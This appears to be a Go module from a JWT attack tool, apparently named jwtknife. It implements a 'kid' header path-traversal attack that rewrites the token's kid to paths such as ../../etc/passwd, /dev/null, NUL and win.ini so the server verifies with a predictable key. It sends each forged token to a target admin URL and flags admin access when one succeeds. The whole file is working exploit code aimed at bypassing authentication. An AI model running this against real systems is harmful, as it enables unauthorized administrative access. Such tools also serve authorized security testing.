package jwt

import (
	"fmt"

	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

var linuxKidPaths = []string{
	"../../../../../../../dev/null",
	"../../../../../../../etc/passwd",
}

var windowsKidPaths = []string{
	"..\\..\\..\\..\\..\\..\\..\\NUL",
	"..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
}

type kidTraversal struct{}

func NewKidTraversalAttack() Attack { return kidTraversal{} }

func (kidTraversal) Name() string {
	return "kid path traversal (filesystem key lookup)"
}

func (kidTraversal) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("kid-traversal")

	if !in.ParsedJWT.HasKid {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "no kid header present"
		return ar
	}

	paths := append(linuxKidPaths, windowsKidPaths...)

	for _, path := range paths {
		mod, err := mutateHeaderOnly(in.RawJWT, "kid", path)
		if err != nil {
			ar.Errors = append(ar.Errors, err.Error())
			continue
		}

		r := in.Client.Do(httpx.RequestPlan{
			Label:     "atk-kid-traversal",
			URL:       in.Targets.AdminURL,
			Method:    "GET",
			JWT:       mod,
			Placement: in.Targets.Placement,
		})

		step := report.Step{
			Label:   "kid-traversal",
			Details: fmt.Sprintf("kid=%s", path),
			HTTP:    report.FromHTTPResult(r),
			JWT:     report.JWTInfo{Token: mod},
		}
		ar.Steps = append(ar.Steps, step)

		if report.IsAdminSuccess(in.Baseline, step.HTTP) {
			ar.Outcome = report.OutcomeSuccess
			ar.Note = "admin access achieved via kid path traversal"
			return ar
		}
		if report.IsInteresting(in.Baseline, step.HTTP) {
			ar.Outcome = report.OutcomeInteresting
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}

func mutateHeaderOnly(raw, key string, val any) (string, error) {
	p, err := jwtknifejwt.Parse(raw)
	if err != nil {
		return "", err
	}
	p.Header[key] = val
	return jwtknifejwt.Rebuild(p)
}
